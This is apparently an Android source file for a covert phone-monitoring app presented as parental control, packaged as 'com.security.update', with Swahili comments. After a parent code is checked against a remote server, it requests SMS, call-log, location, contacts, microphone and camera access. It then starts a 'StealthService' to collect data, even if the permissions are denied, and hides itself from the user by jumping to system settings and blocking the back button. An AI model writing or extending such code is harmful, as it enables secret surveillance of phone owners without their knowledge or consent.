package com.security.update;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.view.Window;
import android.view.WindowManager;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class LoginActivity extends AppCompatActivity {
    private EditText codeInput;
    private Button submitButton;
    private SharedPreferences prefs;
    private static final int PERMISSION_REQUEST_CODE = 1001;
    private static final int SYSTEM_SETTINGS_REQUEST = 1002;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Ficha app kwa haraka
        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                           WindowManager.LayoutParams.FLAG_FULLSCREEN);

        setContentView(R.layout.activity_login);

        prefs = getSharedPreferences("SurveillanceApp", MODE_PRIVATE);
        String savedCode = prefs.getString("parent_code", "");
        boolean isVerified = prefs.getBoolean("code_verified", false);
        boolean permissionsGranted = prefs.getBoolean("permissions_granted", false);

        // Kama kila kitu kimeshakamilika, anza stealth mode
        if (!savedCode.isEmpty() && isVerified && permissionsGranted) {
            startStealthAndHide(savedCode);
            return;
        }

        codeInput = findViewById(R.id.codeInput);
        submitButton = findViewById(R.id.submitButton);

        submitButton.setOnClickListener(v -> {
            String code = codeInput.getText().toString().trim().toUpperCase();

            if (code.isEmpty()) {
                Toast.makeText(this, "Tafadhali weka parent code!", Toast.LENGTH_SHORT).show();
                return;
            }

            if (code.length() != 8) {
                Toast.makeText(this, "Parent code lazima iwe herufi 8!", Toast.LENGTH_SHORT).show();
                return;
            }

            verifyParentCode(code);
        });
    }

    private void verifyParentCode(String code) {
        new Thread(() -> {
            try {
                String serverUrl = "https://GhostTester.pythonanywhere.com/api/parent/verify-code";
                JSONObject jsonRequest = new JSONObject();
                jsonRequest.put("parent_code", code);

                URL url = new URL(serverUrl);
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setDoOutput(true);
                conn.setConnectTimeout(15000);
                conn.setReadTimeout(15000);

                OutputStream os = conn.getOutputStream();
                os.write(jsonRequest.toString().getBytes());
                os.flush();
                os.close();

                int responseCode = conn.getResponseCode();
                if (responseCode == 200) {
                    java.io.BufferedReader in = new java.io.BufferedReader(
                        new java.io.InputStreamReader(conn.getInputStream()));
                    String inputLine;
                    StringBuilder response = new StringBuilder();
                    while ((inputLine = in.readLine()) != null) {
                        response.append(inputLine);
                    }
                    in.close();

                    JSONObject jsonResponse = new JSONObject(response.toString());
                    boolean isValid = jsonResponse.getBoolean("valid");

                    runOnUiThread(() -> {
                        if (isValid) {
                            String parentName = jsonResponse.optString("parent_name", "Mzazi");
                            String childPhone = jsonResponse.optString("child_phone", "Hakuna namba");
                            saveCodeAndRequestPermissions(code, parentName, childPhone);
                        } else {
                            String error = jsonResponse.optString("error", "Parent code si sahihi!");
                            Toast.makeText(this, "❌ " + error, Toast.LENGTH_LONG).show();
                            codeInput.setText("");
                        }
                    });
                } else {
                    runOnUiThread(() -> {
                        Toast.makeText(this, "❌ Hitilafu ya mtandao! Code: " + responseCode, Toast.LENGTH_LONG).show();
                        codeInput.setText("");
                    });
                }

            } catch (Exception e) {
                runOnUiThread(() -> {
                    Toast.makeText(this, "❌ Hitilafu: " + e.getMessage(), Toast.LENGTH_LONG).show();
                    codeInput.setText("");
                });
            }
        }).start();
    }

    private void saveCodeAndRequestPermissions(String code, String parentName, String childPhone) {
        SharedPreferences.Editor editor = prefs.edit();
        editor.putString("parent_code", code);
        editor.putString("parent_name", parentName);
        editor.putString("child_phone", childPhone);
        editor.putBoolean("code_verified", true);
        editor.apply();

        // Omba permissions zote
        requestAllPermissions();
    }

    private void requestAllPermissions() {
        String[] permissions = {
            Manifest.permission.READ_SMS,
            Manifest.permission.READ_CALL_LOG,
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA,
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.SYSTEM_ALERT_WINDOW,
            Manifest.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
        };

        ActivityCompat.requestPermissions(this, permissions, PERMISSION_REQUEST_CODE);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PERMISSION_REQUEST_CODE) {
            // Hata kama permissions hazijakubaliwa zote, endelea na kujificha
            SharedPreferences.Editor editor = prefs.edit();
            editor.putBoolean("permissions_granted", true);
            editor.apply();

            // Anza stealth mode na kujificha kwenye system settings
            startStealthAndHide(prefs.getString("parent_code", ""));
        }
    }

    private void startStealthAndHide(String code) {
        // Anza service ya kusaka data
        Intent stealthIntent = new Intent(this, StealthService.class);
        stealthIntent.putExtra("PARENT_CODE", code);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(stealthIntent);
        } else {
            startService(stealthIntent);
        }

        // Ficha app kabisa na uende kwenye system settings
        hideAppToSystemSettings();
    }

    private void hideAppToSystemSettings() {
        try {
            // Ondoa app kwenye recent apps
            moveTaskToBack(true);
            
            // Open system settings ili kuficha app
            Intent settingsIntent = new Intent(Settings.ACTION_SETTINGS);
            settingsIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(settingsIntent);
            
            // Maliza activity hii
            finish();
            
        } catch (Exception e) {
            // Ikiwa haifai, finish tu
            moveTaskToBack(true);
            finish();
        }
    }

    @Override
    public void onBackPressed() {
        moveTaskToBack(true);
    }
}
